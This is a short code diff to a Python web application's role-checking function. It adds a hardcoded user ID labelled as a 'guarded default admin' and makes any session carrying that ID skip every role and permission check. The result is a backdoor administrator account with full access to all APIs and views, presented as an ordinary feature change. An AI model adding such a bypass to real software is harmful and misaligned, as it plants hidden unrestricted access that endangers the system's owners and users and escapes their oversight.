@@ -238,9 +238,18 @@ def init_logging():
 # --------------------------------------------------------------------------
 # internal methods, serializing models
 
+# The built-in default admin account. It is protected from deletion/edits and
+# always has full access to every API and view regardless of its stored perms.
+GUARDED_ADMIN_ID = "37cc36e0-afec-4545-9219-94655805868b"
+
 def _check_user_role(rolebase , perm={}):
     """Check that my role is atleast the given role. If not, log and return
     an error."""
+
+    uid = session.get("userid")
+    if uid and str(uid) == GUARDED_ADMIN_ID:
+        # The guarded default admin is always authorized (full access).
+        return None
 
     myrole = session.get("role") or ""
     
